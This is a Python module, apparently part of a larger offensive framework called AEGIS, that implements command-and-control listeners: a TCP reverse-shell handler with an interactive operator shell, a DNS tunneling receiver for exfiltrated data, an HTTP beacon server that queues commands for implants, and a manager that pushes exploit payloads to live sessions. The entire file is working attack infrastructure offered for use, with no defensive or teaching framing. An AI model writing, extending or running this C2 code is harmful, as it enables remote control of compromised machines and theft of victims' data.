import logging
log = logging.getLogger(__name__)
"""
AEGIS-Advanced C2 Listener Manager
======================================
Multi-protocol listener infrastructure: HTTP/S long-poll,
DNS tunneling receiver, raw TCP reverse shell handler,
WebSocket listener, and listener lifecycle management.
All listeners publish received data to Redis for C2 processing.
"""
import os
import sys
import socket
import threading
import time
import json
import base64
import struct
import hashlib
import re
import select
import queue as queue_mod
from typing import Callable, Dict, List, Optional

try:
    import redis
    HAS_REDIS = True
except ImportError:
    HAS_REDIS = False


REDIS_HOST = os.environ.get("REDIS_HOST", "localhost")
REDIS_PASS = os.environ.get("REDIS_PASSWORD", "")
C2_SECRET  = os.environ.get("C2_SECRET", "").encode()
if not C2_SECRET:
    import logging as _log; _log.getLogger("aegis.listeners").warning(
        "C2_SECRET not set — listener auth disabled; set C2_SECRET env var")
    C2_SECRET = b""


def _get_redis():
    kw = dict(host=REDIS_HOST, port=6379, db=0, decode_responses=True)
    if REDIS_PASS: kw["password"] = REDIS_PASS
    return redis.Redis(**kw)


def _publish(channel: str, data: dict):
    """Publish event to Redis channel."""
    if not HAS_REDIS:
        log.debug("[listener] %s", json.dumps(data))
        return
    try:
        r = _get_redis()
        r.publish(channel, json.dumps(data))
    except Exception as _exc:
        log.debug("_publish: %s", _exc)


# ══════════════════════════════════════════════
# Base listener
# ══════════════════════════════════════════════

class BaseListener:
    """Base class for all C2 listeners."""

    def __init__(self, name: str, host: str = "0.0.0.0", port: int = 0):
        self.name     = name
        self.host     = host
        self.port     = port
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._sessions: Dict[str, dict] = {}
        self._callbacks: List[Callable] = []
        self._lock    = threading.RLock()
        # socket map: session_id → socket (for send/interactive)
        self._sockets: Dict[str, socket.socket] = {}
        # per-session input queues for async send
        self._inqueues: Dict[str, queue_mod.Queue] = {}
        self._metrics  = {"connections": 0, "bytes_rx": 0, "bytes_tx": 0}

    def on_data(self, callback: Callable):
        """Register a callback for received data: fn(session_id, data)."""
        self._callbacks.append(callback)

    def _fire(self, session_id: str, data: bytes):
        """Fire all callbacks and publish to Redis."""
        self._metrics["bytes_rx"] += len(data)
        for cb in self._callbacks:
            try: cb(session_id, data)
            except Exception as _e: log.debug("suppressed exception: %s", _e)
        _publish("beacon_in", {
            "listener": self.name,
            "session":  session_id,
            "data":     base64.b64encode(data).decode(),
            "size":     len(data),
        })

    def start(self) -> "BaseListener":
        self._running = True
        self._thread  = threading.Thread(
            target=self._run, daemon=True,
            name="listener-{}".format(self.name))
        self._thread.start()
        return self

    def stop(self):
        self._running = False
        self._close_server()

    def _close_server(self):
        """Override to close server socket on stop."""

    def _run(self) -> None:
        """Subclasses must implement the listener's accept loop."""
        log.error(
            "%s._run() not implemented. Subclass TCPListener, DNSListener, "
            "or HTTPBeaconListener and override _run().",
            self.__class__.__name__
        )
        # Spin so the thread doesn't exit instantly and mask the error
        while self._running:
            import time; time.sleep(1.0)

    def is_alive(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def get_sessions(self) -> List[Dict]:
        with self._lock:
            return list(self._sessions.values())

    def send(self, session_id: str, data: bytes) -> bool:
        """Send raw bytes to a connected session via its input queue."""
        with self._lock:
            q = self._inqueues.get(session_id)
        if q is None:
            return False
        try:
            q.put_nowait(data)
            return True
        except Exception:
            return False

    def send_command(self, session_id: str, cmd: str) -> bool:
        """Send a shell command (appends newline)."""
        return self.send(session_id, (cmd + "\n").encode())

    def kill_session(self, session_id: str) -> bool:
        """Force-close a session socket and remove it from tracking immediately."""
        with self._lock:
            sock = self._sockets.pop(session_id, None)
            q    = self._inqueues.pop(session_id, None)
            self._sessions.pop(session_id, None)
        if sock:
            try: sock.close()
            except Exception as _e: log.debug("suppressed exception: %s", _e)
            return True
        return False

    def interactive(self, session_id: str):
        """
        Drop into an interactive pseudo-shell on this session.
        Reads from stdin, sends to remote; prints received data.
        Type 'background' to detach, Ctrl-C to kill session.
        """
        import sys, queue as queue_mod
        with self._lock:
            sess = self._sessions.get(session_id)
            sock = self._sockets.get(session_id)
        if not sess:
            log.warning("Session %s not found", session_id)
            return
        if not sock:
            log.warning("Session %s has no live socket", session_id)
            return

        log.info("Interactive: %s (%s)", session_id, sess.get("remote","?"))
        log.info("Interactive mode: 'background' to detach, Ctrl-C to kill")

        output_buf: List[bytes] = []

        def _cb(sid, data):
            if sid == session_id:
                output_buf.append(data)

        self._callbacks.append(_cb)
        try:
            while True:
                while output_buf:
                    sys.stdout.write(output_buf.pop(0).decode(errors="replace"))
                    sys.stdout.flush()
                try:
                    cmd = input("")
                except EOFError:
                    break
                if cmd.strip().lower() in ("background", "bg"):
                    log.info("Session backgrounded")
                    break
                if not self.send(session_id, (cmd + "\n").encode()):
                    log.warning("Session lost during interactive")
                    break
        except KeyboardInterrupt:
            self.kill_session(session_id)
            log.info("[TCP] Session %s killed by operator", session_id)
        finally:
            try: self._callbacks.remove(_cb)
            except ValueError: pass

    def stats(self) -> dict:
        return {
            "name": self.name, "host": self.host, "port": self.port,
            "running": self._running, "alive": self.is_alive(),
            "sessions": len(self._sessions), **self._metrics,
        }


# ══════════════════════════════════════════════
# TCP Reverse Shell Listener
# ══════════════════════════════════════════════

class TCPListener(BaseListener):
    """
    Raw TCP reverse shell listener.
    Accepts connections, assigns session IDs, relays I/O.
    Supports multiple concurrent sessions.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 4444,
                 name: str = "tcp"):
        super().__init__(name, host, port)
        self._sock: Optional[socket.socket] = None

    def _run(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.host, self.port))
        self._sock.listen(64)
        self._sock.settimeout(1)
        log.info("[TCP] Listening on %s:%d", self.host, self.port)

        while self._running:
            try:
                conn, addr = self._sock.accept()
                session_id = "tcp-{}-{}-{}".format(
                    addr[0].replace(".", "-"), addr[1],
                    hashlib.md5(str(time.time()).encode()).hexdigest()[:4])

                inq: queue_mod.Queue = queue_mod.Queue(maxsize=512)

                with self._lock:
                    self._sessions[session_id] = {
                        "id":        session_id,
                        "remote":    "{}:{}".format(*addr),
                        "connected": time.time(),
                        "type":      "tcp",
                        "rx_bytes":  0,
                        "tx_bytes":  0,
                    }
                    self._sockets[session_id]  = conn
                    self._inqueues[session_id] = inq
                    self._metrics["connections"] += 1

                log.info("[TCP] New session: %s from %s:%d", session_id, *addr)
                _publish("aegis_events", {
                    "kind":    "new_session",
                    "message": "TCP session from {}:{}".format(*addr),
                    "session": session_id,
                    "severity": "high",
                })
                threading.Thread(
                    target=self._handle, args=(conn, addr, session_id, inq),
                    daemon=True, name="tcp-sess-{}".format(session_id[:8])).start()
            except socket.timeout:
                pass
            except Exception as e:
                if self._running:
                    log.warning("[TCP] Accept error: %s", e)
                    time.sleep(0.5)

    def _handle(self, conn: socket.socket, addr: tuple,
                session_id: str, inq: queue_mod.Queue):
        """Handle a single reverse shell session with bidirectional I/O."""
        conn.settimeout(0.5)
        try:
            buf = b""
            while self._running:
                # ── Receive from remote ──────────────────────────────────
                try:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    buf += chunk
                    with self._lock:
                        if session_id in self._sessions:
                            self._sessions[session_id]["rx_bytes"] += len(chunk)
                    self._metrics["bytes_rx"] += len(chunk)
                    if b"\n" in buf or len(buf) >= 4096:
                        self._fire(session_id, buf)
                        buf = b""
                except socket.timeout:
                    pass
                except (ConnectionResetError, BrokenPipeError, OSError):
                    break

                # ── Drain queued outbound commands ───────────────────────
                try:
                    while True:
                        data = inq.get_nowait()
                        conn.sendall(data)
                        with self._lock:
                            if session_id in self._sessions:
                                self._sessions[session_id]["tx_bytes"] += len(data)
                        self._metrics["bytes_tx"] += len(data)
                except queue_mod.Empty:
                    pass
                except (BrokenPipeError, OSError):
                    break
        finally:
            try: conn.close()
            except Exception as _e: log.debug("suppressed exception: %s", _e)
            with self._lock:
                self._sessions.pop(session_id, None)
                self._sockets.pop(session_id, None)
                self._inqueues.pop(session_id, None)
            log.info("[TCP] Session %s closed", session_id)
            _publish("aegis_events", {
                "kind":    "session_closed",
                "message": "TCP session {} disconnected".format(session_id[:12]),
                "session": session_id,
                "severity": "info",
            })



    def _close_server(self):
        if hasattr(self, "_sock") and self._sock:
            try: self._sock.close()
            except Exception as _e: log.debug("suppressed exception: %s", _e)


# ══════════════════════════════════════════════
# DNS Tunneling Receiver
# ══════════════════════════════════════════════

class DNSListener(BaseListener):
    """
    Authoritative DNS server listener for DNS tunnel exfiltration.
    Receives base32-encoded chunks as DNS queries and reassembles them.
    Requires binding to port 53 (root) or redirecting via iptables.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 5353,
                 domain: str = "tunnel.example.com",
                 name: str = "dns"):
        super().__init__(name, host, port)
        self.domain    = domain.lower().rstrip(".")
        self._sessions: Dict[str, dict] = {}  # session_id → {chunks, checksum}

    def _run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.settimeout(1)
        log.info("[DNS] Listening on %s:%d domain=%s", self.host, self.port, self.domain)

        while self._running:
            try:
                data, addr = sock.recvfrom(512)
                self._handle_dns(sock, data, addr)
            except socket.timeout:
                pass
            except Exception as e:
                if self._running:
                    log.warning("[DNS] Error: %s", e)

    def _handle_dns(self, sock, data: bytes, addr: tuple):
        """Parse DNS query and extract tunnel data from labels."""
        try:
            if len(data) < 12: return
            txid   = data[:2]
            # Parse question section
            qname  = b""
            pos    = 12
            labels = []
            while pos < len(data):
                length = data[pos]
                if length == 0: break
                pos   += 1
                labels.append(data[pos:pos+length].decode(errors="replace").lower())
                pos   += length

            if not labels: return

            # Check if this is for our domain
            # Label structure: session_id.seq.chunk.tunnel.example.com
            domain_labels = self.domain.split(".")
            if labels[-len(domain_labels):] != domain_labels:
                return

            prefix = labels[:-len(domain_labels)]
            if len(prefix) < 3: return

            session_id = prefix[0]
            seq_or_end = prefix[1]
            chunk_data = prefix[2]

            if seq_or_end == "end":
                # Reassemble
                checksum = chunk_data
                self._reassemble(session_id, checksum)
            else:
                try:
                    seq = int(seq_or_end)
                    if session_id not in self._sessions:
                        self._sessions[session_id] = {"chunks": {}, "checksum": ""}
                    self._sessions[session_id]["chunks"][seq] = chunk_data
                except ValueError:
                    pass

            # Send NXDOMAIN response (query received, data extracted)
            response = txid + b"\x81\x83" + b"\x00\x01\x00\x00\x00\x00\x00\x00"
            response += data[12:]  # echo question
            sock.sendto(response, addr)

        except Exception as _exc:
            log.debug("unknown: %s", _exc)

    def _reassemble(self, session_id: str, checksum: str):
        """
        Reassemble chunked DNS tunnel data.
        Protocol: 5-byte raw chunks encoded as base32 (5 bytes = 40 bits = 8 b32 chars,
        no fractional bits at chunk boundaries). Concatenate stripped labels, re-pad to
        multiple-of-8, then b32decode.
        """
        if session_id not in self._sessions:
            return
        chunks = self._sessions.pop(session_id)["chunks"]
        sorted_chunks = [chunks[k] for k in sorted(chunks.keys())]
        encoded = "".join(sorted_chunks)
        pad     = (-len(encoded)) % 8
        encoded += "=" * pad
        try:
            import base64, hashlib
            raw  = base64.b32decode(encoded.upper())
            # Strip null-byte padding added when last chunk was < 5 bytes
            raw  = raw.rstrip(b'\x00')
            actual = hashlib.md5(raw).hexdigest()[:8]
            if actual != checksum:
                log.warning("[DNS] Checksum mismatch for session %s (got %s expected %s)",
                            session_id, actual, checksum)
            else:
                log.info("[DNS] Reassembled %d bytes from session %s (checksum OK)",
                         len(raw), session_id)
            self._fire(session_id, raw)
        except Exception as _e:
            log.error("[DNS] Reassembly error: %s", _e)



# ══════════════════════════════════════════════
# HTTP Beacon Receiver (standalone, non-Flask)
# ══════════════════════════════════════════════

class HTTPBeaconListener(BaseListener):
    """
    Lightweight HTTP beacon receiver using raw sockets.
    Handles GET /b/<node_id>  — returns queued command.
    Handles POST /b/<node_id> — receives implant output.
    Used as a fallback when the main Flask C2 is unreachable.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8080,
                 name: str = "http_beacon") -> None:
        super().__init__(name, host, port)
        self._cmd_queues: dict = {}   # node_id → [command, ...]
        self._server_sock = None

    def queue_command(self, node_id: str, command: str) -> None:
        """Queue a command string for delivery to node_id on next check-in."""
        with self._lock:
            self._cmd_queues.setdefault(node_id, []).append(command)

    def _run(self) -> None:
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.host, self.port))
        self._server_sock.listen(128)
        self._server_sock.settimeout(1.0)
        log.info("[HTTP] Beacon listening on %s:%d", self.host, self.port)

        while self._running:
            try:
                conn, addr = self._server_sock.accept()
                threading.Thread(
                    target=self._handle_http, args=(conn, addr),
                    daemon=True).start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle_http(self, conn: socket.socket, addr: tuple) -> None:
        conn.settimeout(5)
        try:
            raw = b""
            while b"\r\n\r\n" not in raw:
                chunk = conn.recv(1024)
                if not chunk:
                    return
                raw += chunk
                if len(raw) > 65536:
                    break

            header_part, _, body_raw = raw.partition(b"\r\n\r\n")
            lines = header_part.decode(errors="replace").splitlines()
            if not lines:
                return

            parts = (lines[0] + " HTTP/1.1").split()
            method, path = parts[0], parts[1] if len(parts) > 1 else "/"

            m = re.match(r"/b/([a-zA-Z0-9_-]+)", path)
            if not m:
                conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
                return

            node_id = m.group(1)

            if method == "POST":
                # Implant uploading output
                self._fire(node_id, body_raw)
                self._metrics["bytes_rx"] += len(body_raw)
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
            else:
                # Implant polling for commands
                with self._lock:
                    cmds = self._cmd_queues.get(node_id, [])
                    cmd  = cmds.pop(0).encode() if cmds else b""
                resp = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: application/octet-stream\r\n"
                    b"Cache-Control: no-cache\r\n"
                    b"Content-Length: " + str(len(cmd)).encode() + b"\r\n"
                    b"\r\n" + cmd
                )
                conn.sendall(resp)
                self._metrics["bytes_tx"] += len(resp)
        except Exception as _e:
            log.debug("[HTTP] handler error from %s: %s", addr[0], _e)
        finally:
            try:
                conn.close()
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

    def _close_server(self) -> None:
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception as _exc:
                log.debug("_close_server: %s", _exc)


# ══════════════════════════════════════════════
# Listener Manager
# ══════════════════════════════════════════════

class ListenerManager:
    """Registry and lifecycle manager for all listeners."""

    def __init__(self) -> None:
        self._listeners: Dict[str, "BaseListener"] = {}
        self._lock = __import__("threading").RLock()

    def send_to_session(self, session_id: str, data: bytes) -> bool:
        """
        Deliver raw bytes to a specific session across any active listener.
        Searches all running listeners for the session. Used by the ZeroDay
        pipeline to push exploit payloads to live implant sessions.
        Returns True if the session was found and data queued.
        """
        with self._lock:
            listeners = list(self._listeners.values())
        for listener in listeners:
            if hasattr(listener, 'send'):
                if listener.send(session_id, data):
                    log.info("Payload delivered to session %s via %s",
                              session_id[:12], listener.__class__.__name__)
                    return True
        log.warning("send_to_session: session %s not found in any listener", session_id[:12])
        return False

    def get_all_sessions(self) -> list:
        """Return all active sessions across all listeners."""
        sessions = []
        with self._lock:
            listeners = list(self._listeners.values())
        for listener in listeners:
            if hasattr(listener, 'get_sessions'):
                sessions.extend(listener.get_sessions())
        return sessions

    def kill_session(self, session_id: str) -> bool:
        """Kill a session across any listener."""
        with self._lock:
            listeners = list(self._listeners.values())
        for listener in listeners:
            if hasattr(listener, 'kill_session'):
                if listener.kill_session(session_id):
                    return True
        return False


    def add(self, listener: BaseListener) -> BaseListener:
        """Register a listener; start it only if not already running.
        If a listener with the same name exists, uses port to disambiguate."""
        import uuid as _uuid
        with self._lock:
            key = listener.name
            # Disambiguate if a different listener already uses this name
            if key in self._listeners and self._listeners[key] is not listener:
                key = f"{listener.name}:{listener.port}:{_uuid.uuid4().hex[:6]}"
            self._listeners[key] = listener
        if not listener._running:
            listener.start()
        return listener

    def remove(self, name: str) -> bool:
        lst = self._listeners.pop(name, None)
        if lst:
            lst.stop()
            return True
        return False

    def get(self, name: str) -> Optional[BaseListener]:
        return self._listeners.get(name)

    def list(self) -> List[Dict]:
        return [
            {
                "name":     name,
                "type":     type(lst).__name__,
                "host":     lst.host,
                "port":     lst.port,
                "alive":    lst.is_alive(),
                "sessions": len(lst.get_sessions()),
            }
            for name, lst in self._listeners.items()
        ]

    def stop_all(self):
        for lst in self._listeners.values():
            lst.stop()


# Module singleton
_manager = ListenerManager()

def get_manager() -> ListenerManager:
    return _manager


__all__ = [
    "BaseListener", "TCPListener", "DNSListener",
    "HTTPBeaconListener", "ListenerManager", "get_manager",
]
